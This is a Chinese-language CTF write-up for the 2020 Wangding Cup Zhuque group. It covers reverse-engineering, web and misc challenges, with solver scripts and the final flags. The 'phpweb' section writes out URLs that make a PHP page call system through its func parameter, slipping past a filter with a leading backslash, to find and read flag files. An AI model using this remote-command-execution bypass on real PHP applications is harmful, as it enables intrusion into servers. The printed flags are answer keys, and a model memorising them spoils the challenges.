[TOC]

* TOC
{:toc}

# 2020_网鼎杯朱雀组writeup

## reverse 0x1 go

本题关键就是发现base64加密表。

1.该题是用go语言编写，通过解密该题的key得到flag

![](./2020_网鼎杯朱雀组writeup.md4.png)

2.修改base64码表，再把输入的key计算base64

![](./2020_网鼎杯朱雀组writeup.md5.png)

3.然后与加密的key做比较，如果正确就会把输入的key当作解密flag的key去自解密

![](./2020_网鼎杯朱雀组writeup.md6.png)

4 修改码表只能得到真正key的前15位，最后一位要脑动想想

key: `nRKKAHzMrQzaqQzKpPHClX`

解码提示长度不对。

5 经过调式发现最后1X没有解密

6 看代码发现会有一个比较加密base64串右边是否有==的操作

![](./2020_网鼎杯朱雀组writeup.md7.png)

7 我们把key的密文最后加上==然后再去解密一次得到正确的key

8 输入key，然后程序就会自动打印出flag



```python
c = 'cbdb2c89f6800e6c93e1c1e541e1a89758f45fd988c6652fa955db2f00290da27' # 加密后的flag
# base64 自定义变化码表
import base64
# 直接用 nRKKAHzMrQzaqQzKpPHClX 解没出来。提示长度不对，补个=号试试。成功了。
cipher = 'nRKKAHzMrQzaqQzKpPHClX=='
my_base64chars = 'XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01'
STD_BASE64CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
# base64chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'
cipher = cipher.translate(str.maketrans(my_base64chars, STD_BASE64CHARS))
data = base64.b64decode(cipher)
print(data)
# What_is_go_a_A_H
# 拿回去输入key出flag了。
```

## reverse 0x2 tree

https://www.52pojie.cn/thread-1181476-1-1.html

打开程序找到main函数

![what1](./2020_网鼎杯朱雀组writeup.md1.png)


进入到chkflag函数，发现其是将输入的flag中的xxx每一个x都换成2进制的形式，每一个4位，然后存在glockflag中

![](./2020_网鼎杯朱雀组writeup.md2.png)

parse函数是将glockflag中的二进制拿出来，0代表左，1代表右，开始遍历叶子节点，如果找到的叶子节点是zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx，就正确

![](./2020_网鼎杯朱雀组writeup.md3.png)

我们先将 每个节点及其路径打印出来

```python
def traverse_leaf(pnode):
    if pnode != 0:
        if Dword(pnode + 12) == 0 and Dword(pnode + 16) == 0:
            print(chr(Byte(pnode)))
            print("".join(a))
            lujing.append([chr(Byte(pnode)), "".join(a)])
        a.append('0')
        traverse_leaf(Dword(pnode + 12))
        a.append('1')
        traverse_leaf(Dword(pnode + 16))
    if pnode != 0X0406530:
        a.pop()


traverse_leaf(0X0406530)
print(lujing)
```

>[['y', '0000'], ['b', '00010'], ['q', '00011'], ['g', '0010'], ['f', '0011'], ['j', '010'], ['w', '01100'], ['p', '01101'], ['x', '011100'], ['d', '0111010'], ['i', '0111011'], ['k', '01111'], ['s', '100'], ['z', '1010'], ['n', '1011'], ['c', '11000'], ['t', '110010'], ['e', '110011'], ['h', '1101'], ['o', '11100'], ['l', '1110100'], ['u', '11101010'], ['r', '111010110'], ['a', '111010111'], ['m', '111011'], ['v', '1111']]

然后在开始写脚本，将 zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx 转成路径，然后拼起来，4位4位的分开就是flag中的xxxx

```python
lujing = [['y', '0000'], ['b', '00010'], ['q', '00011'], ['g', '0010'], ['f', '0011'], ['j', '010'], ['w', '01100'], ['p', '01101'], ['x', '011100'], ['d', '0111010'], ['i', '0111011'], ['k', '01111'], ['s', '100'], ['z', '1010'], ['n', '1011'], ['c', '11000'], ['t', '110010'], ['e', '110011'], ['h', '1101'], ['o', '11100'], ['l', '1110100'], ['u', '11101010'], ['r', '111010110'], ['a', '111010111'], ['m', '111011'], ['v', '1111']]
res = "zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx"
flag01 = ""
flagx = ""
for i in res:
    for j in lujing:
        if i in j[0]:
            flag01 += j[1]
print(flag01)
for i in range(0, len(flag01), 4):
    tmp = "%x" % int(flag01[i:i+4], 2)
    flagx += tmp
print(flagx)
```

最终打印出flagx是afa41fc8574f12481a849d7f7120f89c

将flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}替换掉，即

flag为flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}

题目链链接：https://pan.baidu.com/s/1RUPL9W2119cJ8TDVf2m-8Q

提取码：sca9

## web 0x2 phpweb

看源码, 能提交func和p, 看value可知func是函数名, p 是参数。

func=file_get_contents&p=index.php看源码。

过滤了常用看system等，通过加\来过

1.先找flag位置

`http://xxx.ichunqiu.com/index.php?func=\system&p=find / -name flag*`

2.看flag内容

`http://xxx.ichunqiu.com/index.php?func=\system&p=cat /tmp/flagoefiu4r93`

## misc 0x2 九宫格

根据二维码识别出二进制字符串，一共576位，576位转换成TEXT文本。题目提示的九宫格拼出的数字是245568。利用rabbit解密，对前面的TEXT文本进行解密，解密下方填上245568.即可得到解密flag



```python
from pathlib import Path
from PIL import Image
from pyzbar.pyzbar import decode


f = b''
for i in sorted(Path('.').rglob('*.png'), key=lambda x: x.stem.rjust(5, '0')):
    data = decode(Image.open(i))
    data = data[0].data
    data = b'1' if data == b'one' else b'0'
    f += data
# '010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001'

a = f.decode()
b = bytearray.fromhex(hex(int(a, 2))[2:])
print(b)

# U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa
```
key 是 245568。

找个在线的解密一下。

`flag{2c4fdc156fe74836954a05058c5d0382}`


## misc 0x4 key_123

解压密码123  然后钥匙图片改高度  锁图片binwalk分出来一个压缩包。
然后就是看钥匙图片上的编码了--差分曼彻斯特
```
295965569a596696995a9aa969996a6a9a6699656569699
96959669566a5655699669aa5656966a566a56656
```
[曼切斯特与差分曼切斯特](https://skysec.top/2017/07/10/曼切斯特与差分曼切斯特/)  ?
